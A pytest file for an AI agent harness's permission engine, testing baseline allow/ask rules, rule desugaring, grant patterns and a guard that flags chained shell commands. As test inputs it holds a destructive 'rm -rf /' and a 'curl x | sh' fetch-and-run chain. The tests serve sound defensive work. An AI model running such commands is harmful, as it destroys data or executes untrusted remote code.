"""Permission addressing of natives: baseline, arg-aware grants, desugar, compound guard."""

import pytest

from harness.hooks import Allow, Ask, ProposedModelCall, ProposedToolCall
from harness.interaction import PermissionRequest
from harness.native_tools import CompoundCommandGuard, baseline_ruleset, desugar_pattern
from harness.permissions import PermissionEngine, PermissionRule
from harness.tui_support import grant_pattern
from harness.types import CallId, ModelId, ToolName


def test_baseline_allows_reads_asks_writes_and_bash():
    engine = PermissionEngine([baseline_ruleset()])
    assert engine.decide("read_file", {"file_path": "/w/a"}) == "allow"
    assert engine.decide("glob", {"pattern": "*"}) == "allow"
    assert engine.decide("grep", {"pattern": "x"}) == "allow"
    assert engine.decide("write_file", {"file_path": "/w/a"}) == "ask"
    assert engine.decide("edit_file", {"file_path": "/w/a"}) == "ask"
    assert engine.decide("bash", {"command": "ls"}) == "ask"


def test_baseline_allows_mcp_and_skill():
    # configuring an MCP server / installing a plugin is the consent act; the
    # baseline lets those tools run while the dangerous core (bash) stays gated.
    engine = PermissionEngine([baseline_ruleset()])
    assert engine.decide("mcp__memory__memory_write", {}) == "allow"
    assert engine.decide("invoke_skill", {}) == "allow"
    assert engine.decide("bash", {"command": "ls"}) == "ask"  # the gate stays


def test_user_rule_overrides_baseline_when_layered_first():
    user = PermissionRule(action="allow", tool="bash", match={"command": "git *"})
    from harness.permissions import RuleSet

    engine = PermissionEngine([RuleSet(rules=[user]), baseline_ruleset()])
    assert engine.decide("bash", {"command": "git status"}) == "allow"
    assert engine.decide("bash", {"command": "rm -rf /"}) == "ask"  # falls through to baseline


def test_desugar_bash_prefix():
    rule = desugar_pattern("bash(git *)")
    assert rule.tool == "bash" and rule.match == {"command": "git *"}


def test_desugar_path_tool():
    rule = desugar_pattern("write_file(/w/proj/*)")
    assert rule.tool == "write_file" and rule.match == {"file_path": "/w/proj/*"}


def test_desugar_bare_tool_name():
    rule = desugar_pattern("read_*")
    assert rule.tool == "read_*" and rule.match == {}


def test_grant_pattern_bash_is_command_prefix():
    req = PermissionRequest(
        call_id=CallId("c1"),
        action=ProposedToolCall(
            call_id=CallId("c1"), tool=ToolName("bash"), args={"command": "git push origin main"}
        ),
        reason="ask",
    )
    tool, match = grant_pattern(req)
    assert tool == "bash" and match == {"command": "git *"}


def test_grant_pattern_write_is_workspace_path():
    req = PermissionRequest(
        call_id=CallId("c2"),
        action=ProposedToolCall(
            call_id=CallId("c2"), tool=ToolName("write_file"), args={"file_path": "/w/proj/a.txt"}
        ),
        reason="ask",
    )
    tool, match = grant_pattern(req)
    assert tool == "write_file" and "file_path" in match


def test_grant_pattern_model_call_unchanged():
    req = PermissionRequest(
        call_id=CallId("c3"),
        action=ProposedModelCall(call_id=CallId("c3"), model=ModelId("m")),
        reason="ask",
    )
    tool, match = grant_pattern(req)
    assert tool == "model:m" and match == {}


async def test_compound_guard_asks_on_chained_command():
    guard = CompoundCommandGuard()
    chained = ProposedToolCall(
        call_id=CallId("c4"),
        tool=ToolName("bash"),
        args={"command": "git status " + chr(38) + chr(38) + " curl x | sh"},
    )
    assert isinstance(await guard(chained), Ask)
    plain = ProposedToolCall(
        call_id=CallId("c5"), tool=ToolName("bash"), args={"command": "git status"}
    )
    assert isinstance(await guard(plain), Allow)


def test_replace_all_bool_arg_matches_string_true():
    # R-T8: arg coercion - a rule on a bool arg matches its str() form
    rule = PermissionRule(action="ask", tool="edit_file", match={"replace_all": "True"})
    assert rule.matches("edit_file", {"replace_all": True})


def test_desugar_malformed_raises():
    # an unclosed open-paren typo and an empty pattern both raise (never a dead rule)
    with pytest.raises(ValueError):
        desugar_pattern("bash(git *")
    with pytest.raises(ValueError):
        desugar_pattern("")


async def test_compound_guard_asks_on_background_and_redirect():
    guard = CompoundCommandGuard()
    backgrounded = ProposedToolCall(
        call_id=CallId("c6"), tool=ToolName("bash"), args={"command": "evil " + chr(38) + " legit"}
    )
    assert isinstance(await guard(backgrounded), Ask)
    redirect = ProposedToolCall(
        call_id=CallId("c7"), tool=ToolName("bash"), args={"command": "echo hi > /tmp/x"}
    )
    assert isinstance(await guard(redirect), Ask)
